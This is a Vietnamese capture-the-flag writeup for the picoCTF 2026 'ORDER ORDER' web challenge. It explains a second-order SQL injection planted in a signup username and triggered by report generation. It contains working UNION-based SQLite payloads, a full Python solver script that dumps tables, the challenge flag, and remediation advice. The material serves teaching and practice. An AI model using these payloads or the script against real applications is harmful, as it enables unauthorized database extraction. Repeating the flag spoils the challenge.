
<img width="805" height="645" alt="image" src="https://github.com/user-attachments/assets/99416035-1be5-44ab-af88-2f8b9a68e212" />

# 🚩 ORDER ORDER: picoCTF 2026 (Web Exploitation, Hard)

> **Flag:** `picoCTF{s3c0nd_0rd3r_1t_1s_97d307ce}`

> **Tác giả challenge:** Darkraicg492 · 300 điểm

> **Vector tấn công:** Second-Order SQL Injection (SQLite) qua trường **username** lúc đăng ký → kích nổ tại chức năng **Generate Report**

>

> ✅ Toàn bộ writeup + exploit script hoàn chỉnh nằm trong chính file README.md này.

---

## 📑 MỤC LỤC

1. [Thông tin & mô tả thử thách](#1-thông-tin--mô-tả-thử-thách)
2. [Recon từng bước](#2-recon-từng-bước)
3. [Bản đồ ứng dụng](#3-bản-đồ-ứng-dụng)
4. [Các ngõ cụt (vì sao chúng đáng học)](#4-các-ngõ-cụt)
5. [Hai manh mối quyết định](#5-hai-manh-mối-quyết-định)
6. [Lý thuyết Second-Order SQLi](#6-lý-thuyết-second-order-sqli)
7. [Khai thác chi tiết TỪNG BƯỚC](#7-khai-thác-chi-tiết-từng-bước)
8. [Giải mã hint "ORDER"](#8-giải-mã-hint-order)
9. [Sơ đồ flow tổng thể](#9-sơ-đồ-flow)
10. [Exploit script HOÀN CHỈNH](#10-exploit-script-hoàn-chỉnh)
11. [Cách vá lỗi](#11-cách-vá-lỗi)

---

## 1. THÔNG TIN & MÔ TẢ THỬ THÁCH

```
ORDER ORDER: Web Exploitation: Hard: Darkraicg492: picoCTF 2026

"Can you try to get the flag from our website.
 I've prepared my queries everywhere! I think!"

Hint #1: What does order in SQL Injection mean?
Instance: http://crystal-peak.picoctf.net:<PORT>/
```

**Giải mã lời đề ngay từ đầu:**

| Câu chữ | Ý nghĩa thực |
|---|---|
| "I've prepared my queries everywhere!" | App dùng **prepared statements** (parameterized queries) ở hầu hết nơi |
| "...I think!" | ...nhưng **sót một chỗ**: đó chính là lỗ hổng |
| Hint: "What does order in SQL Injection mean?" | Chơi chữ **first-ORDER vs second-ORDER** injection; đồng thời gợi `ORDER BY` (dùng để đếm cột) |

---

## 2. RECON TỪNG BƯỚC

### 2.1: Trang chủ: Expense Tracker

```console
$ curl -s http://crystal-peak.picoctf.net:<PORT>/
<title>Expense Tracker</title>              ← Flask + MaterializeCSS
<li><a href="/signup">Sign up</a></li>
<li><a href="/login">Login</a></li>
```

### 2.2: Form đăng ký / đăng nhập

```html
POST /signup  → username, email, password
POST /login   → username, password
```

Sau login, cookie dạng `.eJwN...` ⇒ xác nhận **Flask** (session ký itsdangerous).

### 2.3: Link nội bộ sau login

```
/dashboard    /expenses    /inbox    /logout
```

### 2.4: `/expenses`: nút "Generate Report"

```html
<form method="POST" action="/expenses">         <!-- thêm chi tiêu -->
  <input name="description"> <input name="amount"> <input name="date">
</form>
<form method="POST" action="/generate_report">  <!-- chỉ 1 nút bấm, 0 field -->
  <button>Generate Report</button>
</form>
```

### 2.5: Luồng report (quan trọng!)

```console
$ POST /generate_report          → 302
(chờ 3-10 giây: report sinh BẤT ĐỒNG BỘ!)
$ GET /inbox
<td>Expense report as of 26/08/2026, 07:44:11</td>
<td>./reports/report_hack0_1787730251.csv</td>     ← username nằm trong tên file!
<a href="/download_report/1">Download</a>

$ GET /download_report/1
description,amount,date
coffee,3.5,2026-08-01
lunch,12.0,2026-08-02
```

**Ba quan sát ghi lại ngay:**
1. Report sinh **bất đồng bộ** → phải poll inbox.
2. Filename = `report_<username>_<ts>.csv` → **username được ghép vào đường dẫn**.
3. Nội dung CSV = expense của user.

---

## 3. BẢN ĐỒ ỨNG DỤNG

| Endpoint | Method | Tham số | Ghi chú |
|---|---|---|---|
| `/signup` | POST | username, email, password | INSERT user |
| `/login` | POST | username, password | SELECT user |
| `/dashboard` | GET |: | chào theo username session |
| `/expenses` | GET | `?page=N` (hiện khi >10 dòng) | list expenses |
| `/expenses` | POST | description, amount, date | thêm expense |
| `/generate_report` | POST | *(không field)* | ★ query CSV + ghi file |
| `/inbox` | GET |: | list reports, **leak lỗi generation** |
| `/download_report/<id>` | GET | id | gửi file: **không check sở hữu (IDOR!)** |
| `/delete_expense/<id>` | POST | id | xóa expense |

Stack xác nhận: **Flask + SQLite**.

---

## 4. CÁC NGÕ CỤT (đáng học vì loại trừ đúng)

### ❌ Ngõ cụt 1: Fuzz tham số sort/order
Thử **17 tên param** (`order, sort, sort_by, order_by, orderby, column, dir, group_by...`) × nhiều giá trị trên 4 endpoint (`/expenses` GET+POST, `/inbox`, `/generate_report`, `/download_report`) với oracle = **thứ tự dòng thật** (không phải độ dài HTML).
→ **Không gì thay đổi.** Không tồn tại param sort.

### ❌ Ngõ cụt 2: Route ẩn
Brute-force ~20 tên route (`admin, api, search, flag, debug...`) → toàn 404.

### ❌ Ngõ cụt 3: Quote probe mọi field request-time
Gửi `'`, `"`, `' OR '1'='1`, `a', (SELECT 1), 'x` vào signup/login/expenses → **mọi response bình thường, không lỗi SQL**.
⇒ Input trực tiếp đều parameterize sạch ("prepared queries everywhere": đúng như đề!).

### ❌ Ngõ cụt 4: `/download_report/<id>`
`999` → 500 (không tồn tại), chữ cái → 404 (Flask int converter chặn trước DB). Không inject được.

### ⚠️ Phát hiện phụ: IDOR
```console
# user beta tải report id=1 của user alpha:
$ curl -b beta_cookie .../download_report/1  → 200 CSV của alpha!
```
Không check ownership: bug thật nhưng không dẫn thẳng tới flag (instance chỉ có report của mình).

---

## 5. HAI MANH MỐI QUYẾT ĐỊNH

### 🎯 Manh mối 1: Username chứa ký tự đặc biệt + inbox leak lỗi

Đăng ký user `../evil` thành công. Khi bấm Generate Report, **inbox hiện nguyên văn lỗi**:

```html
<td>Report generation failed. Cause Cannot save file into a non-existent
    directory: 'reports/report_..'</td>
```

⇒ App **tự khai lộ**: username được nối THÔ vào đường dẫn file. Nếu nối thô vào path thì khả năng rất cao cùng hàm đó cũng **nối thô vào SQL**!

### 🎯 Manh mối 2: Writeup cộng đồng xác nhận hướng

Các writeup picoCTF 2026 (GitHub archive, InfoSec Writeups...) chỉ ra đúng kỹ thuật: **Second-Order SQL Injection**: payload đặt trong username lúc SIGNUP, detonate khi Generate Report chạy:

```sql
SELECT description, amount, date FROM expenses WHERE username = '<username>'
--                                              └── nối chuỗi THÔ 💉
```

---

## 6. LÝ THUẾT SECOND-ORDER SQLI

```
FIRST-ORDER : input độc hại → query thực thi NGAY lập tức
SECOND-ORDER: input độc hại → được LƯU lại (an toàn) → REQUEST KHÁC
              lấy nó ra và NỐI CHUỖI vào query mới 💥
```

**Vì sao vượt qua nổi "prepared statements everywhere"?**

```python
# Lần 1 (signup): AN TOÀN: parameterized
db.execute("INSERT INTO users(username,...) VALUES (?,...)", (username,))

# Lần 2 (generate_report): CHẾT NGƯỜI: f-string với dữ liệu ĐÃ LƯU trong DB
query = f"SELECT description, amount, date FROM expenses WHERE username = '{user}'"
```

Developer tin rằng "dữ liệu đã nằm trong DB = tin cậy". **Sai lầm kinh điển:** escaping phải diễn ra **tại điểm sử dụng**, không phải điểm nhập.

**Cơ chế payload**: username =
```
' UNION SELECT name, value, '2026-01-01' FROM aDNyM19uMF9mMTRn--
```

query thực thi thành:

```sql
SELECT description, amount, date FROM expenses WHERE username = ''
UNION SELECT name, value, '2026-01-01' FROM aDNyM19uMF9mMTRn--'
                                                     └── comment hóa phần thừa
```

- UNION cần **đúng 3 cột** khớp (description, amount, date)
- Kết quả UNION ghi vào CSV → đọc trực tiếp 🚩
- SQL sai cú pháp/sai bảng → **exception in nguyên văn vào inbox** → oracle hoàn hảo

---

## 7. KHAI THÁC CHI TIẾT TỪNG BƯỚC

### Bước 1: Bắn thử xác nhận inject

Signup username:
```
' UNION SELECT name, value, '2026-01-01' FROM aDNyM19uMF9mTRn--
```
(tên bảng lấy tạm từ writeup). Login → Generate Report → inbox báo:

```
Report generation failed. Cause no such table: aDNyM19uMF9mTRn
```

🎉 **Chốt hạ:** lỗi SQL xảy ra thật ⇒ payload đi nguyên xi vào query. Chỉ cần tìm đúng tên bảng.

### Bước 2: Dump danh sách bảng từ `sqlite_master`

Username mới:
```
' UNION SELECT group_concat(tbl_name), 0, '2026-01-01' FROM sqlite_master WHERE type='table'--
```
(`group_concat` gom hết về 1 dòng để khớp ràng buộc 3 cột.)

Login → Generate → chờ ~8s → tải report:

```
description,amount,date
"users,sqlite_sequence,expenses,reports,inbox,aDNyM19uMF9mMTRn",0,2026-01-01
```

⇒ Bảng ẩn thật sự: **`aDNyM19uMF9mMTRn`**: khác 1 ký tự so với writeup!
📌 **Bài học: LUÔN verify tên bảng trên chính instance của mình.**

### Bước 3: Trích xuất flag

Username cuối cùng:
```
' UNION SELECT name, value, '2026-01-01' FROM aDNyM19uMF9mMTRn--
```

Signup → Login → Generate Report → đợi async → tải CSV:

```
description,amount,date
flag,picoCTF{s3c0nd_0rd3r_1t_1s_97d307ce},2026-01-01
```

🚩 **FLAG: `picoCTF{s3c0nd_0rd3r_1t_1s_97d307ce}`**: chính flag tự xác nhận kỹ thuật: *"second order it is"*!

### 📌 Ghi chú vận hành then chốt

| Chi tiết | Vì sao |
|---|---|
| Payload đặt vào **username** | chỉ username bị nối vào query/path |
| Payload **không chứa `/`** | username cũng ghép vào path file: có `/` là ghi file fail trước |
| Signup xong phải **login lại** bằng chính chuỗi payload | session chỉ cấp sau login |
| Poll inbox nhiều lần | report sinh bất đồng bộ ~3-10s |
| Mỗi payload = 1 tài khoản mới | payload cố định trong username |
| Kết quả có dấu phẩy bị CSV wrap `"..."` | parse CSV cho chuẩn |

---

## 8. GIẢI MÃ HINT "ORDER"

1. **Second-order SQLi** là đáp án câu đố "what does order mean?"
2. `ORDER BY N` vẫn hữu ích kiểu cổ điển để **đếm cột**: `' ORDER BY 4--` → lỗi *"1st ORDER BY term out of range: should be between 1 and 3"* ⇒ query có đúng 3 cột (ở đây tôi đi tắt vì CSV đã lộ schema).
3. Tên challenge = first-**order** + second-**order**.

---

## 9. SƠ ĐỒ FLOW

```
ATTACKER                                APP (Flask+SQLite)
   │ POST /signup  username=' UNION...--    │
   ├───────────────────────────────────────►│ INSERT ... VALUES (?)      ← an toàn
   │                                        │   payload NẰM YÊN trong DB
   │ POST /login (payload)                  │
   ├───────────────────────────────────────►│ SELECT ... WHERE ?          ← an toàn
   │◄─ session cookie ──────────────────────┤
   │ POST /generate_report                  │
   ├───────────────────────────────────────►│ f"...WHERE username='{payload}'"
   │                                        │ 💥 DETONATE: query độc hại chạy
   │ (poll) GET /inbox                      │
   │◄─ link /download_report/N ─────────────┤
   │ GET /download_report/N                 │
   │◄─ CSV: flag,picoCTF{s3c0nd_0rd3r_1t_1s_97d307ce} 🚩
```

---

## 10. EXPLOIT SCRIPT HOÀN CHỈNH

> Copy phần dưới đây thành file `order-solve.py` (hoặc dùng trực tiếp: toàn bộ logic đã được nhúng trong chính README này).

```python
#!/usr/bin/env python3
"""
ORDER ORDER: picoCTF 2026 (Web/Hard): Second-Order SQL Injection solver
Usage: python order-solve.py http://crystal-peak.picoctf.net:<PORT>
"""
import urllib.request, urllib.parse, urllib.error, http.cookiejar
import re, sys, time, io

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000").rstrip("/")

def session():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def req(op, path, data=None):
    r = urllib.request.Request(
        BASE + path,
        data=urllib.parse.urlencode(data).encode() if data is not None else None,
    )
    try:
        with op.open(r, timeout=25) as resp:
            return resp.getcode(), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, f"<conn-error {type(e).__name__}>"

def run_sql(payload_username: str, tag: str) -> str:
    """Đăng ký payload làm username → login → generate report → thu hoạch kết quả."""
    op = session()
    suffix = str(int(time.time()))[-6:]
    email = f"{tag}{suffix}@x.com"
    pw = "p123"

    c, _ = req(op, "/signup", {"username": payload_username, "email": email, "password": pw})
    print(f"  [{tag}] signup({c}) user={payload_username[:60]}...")
    c, _ = req(op, "/login", {"username": payload_username, "password": pw})
    print(f"  [{tag}] login({c})")
    c, _ = req(op, "/generate_report", {})
    print(f"  [{tag}] generate({c}): chờ job bất đồng bộ...")

    for i in range(20):  # generation là async: poll inbox
        time.sleep(3)
        c, inbox = req(op, "/inbox")
        m_err = re.search(r"Report generation failed\.\s*Cause\s*([^<]*)", inbox)
        if m_err:
            return f"<<SQL/APP ERROR>> {m_err.group(1).strip()}"
        m_rep = re.search(r"/download_report/(\d+)", inbox)
        if m_rep:
            rid = m_rep.group(1)
            c, csv_text = req(op, f"/download_report/{rid}")
            return f"(report #{rid})\n{csv_text}"
    return "<<TIMEOUT waiting for report>>"

def main():
    print(f"[*] Target: {BASE}")

    # ---- Bước 1: liệt kê bảng ------------------------------------------
    p_tables = (
        "' UNION SELECT group_concat(tbl_name), 0, '2026-01-01' "
        "FROM sqlite_master WHERE type='table'--"
    )
    out = run_sql(p_tables, "tables")
    print("[*] Result:\n" + out + "\n")

    # ---- Bước 2: tự phát hiện bảng ẩn (tên trông như base64) ------------
    EXCLUDE = {"users", "sqlite_sequence", "expenses", "reports", "inbox",
               "description", "amount", "date", "group_concat"}
    hidden = None
    for cand in set(re.findall(r"[A-Za-z0-9_]+", out)):
        if cand not in EXCLUDE and len(cand) >= 12 and re.fullmatch(r"[A-Za-z0-9_]+", cand):
            hidden = cand
    if not hidden:
        print("[!] Không tự tìm thấy bảng ẩn."); return
    print(f"[*] Hidden table detected: {hidden}\n")

    # ---- Bước 3: dump bảng ẩn lấy flag ----------------------------------
    p_dump = f"' UNION SELECT name, value, '2026-01-01' FROM {hidden}--"
    out = run_sql(p_dump, "flag")
    print("[*] Result:\n" + out + "\n")

    fm = re.search(r"picoCTF\{[^}]*\}", out)
    if fm:
        print(f"\n[+] FLAG: {fm.group(0)}")
    else:
        # fallback: dump toàn bộ schema để pivot thủ công
        out = run_sql(
            "' UNION SELECT group_concat(sql), 0, 'x' FROM sqlite_master--", "schema")
        print("[*] Schema:\n" + out)

if __name__ == "__main__":
    main()
```

### Cách chạy

```console
$ pip install nothing   # chỉ dùng stdlib Python 3
$ python order-solve.py http://crystal-peak.picoctf.net:<PORT>

[*] Target: http://crystal-peak.picoctf.net:<PORT>
  [tables] signup(200) login(200) generate(302)
[*] Result:
(report #2)
description,amount,date
"users,sqlite_sequence,expenses,reports,inbox,aDNyM19uMF9mMTRn",0,2026-01-01

[*] Hidden table detected: aDNyM19uMF9mMTRn
  [flag] ...
[+] FLAG: picoCTF{s3c0nd_0rd3r_1t_1s_XXXXXXXX}
```

---

## 11. CÁCH VÁ LỖI

1. **Parameterize tại điểm sử dụng**: query report phải là `SELECT ... WHERE username = ?` dù dữ liệu đến từ DB.
2. **Allow-list username** lúc đăng ký: `^[a-zA-Z0-9_]{3,32}$`: triệt tiêu luôn cả path-injection.
3. **Không leak lỗi DB ra UI** (inbox): log server-side, trả message chung chung.
4. Sửa **IDOR** `/download_report/<id>`: kiểm tra `report.username == session.username`.
5. Đặt filename theo `id` thay vì username.

---

*Writeup + exploit bởi WRET26*
